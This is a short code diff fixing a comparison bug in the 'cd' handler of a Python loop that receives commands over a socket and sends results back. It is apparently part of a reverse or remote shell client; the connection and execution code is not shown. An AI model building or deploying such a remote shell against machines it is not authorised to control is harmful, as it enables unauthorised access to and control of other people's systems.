@@ -18,7 +18,7 @@ while True:
     if command == "exit":
         s.close()
         break          # if the given command is "exit" then terminate connection and break out of the loop 
-    elif command[:2] = "cd":
+    elif command[:2] == "cd":
         os.chdir(command[3:])
         s.send("no output".encode("UTF-8"))
         continue        # if the given command's first 2 characters are "cd" then change directory and send no output
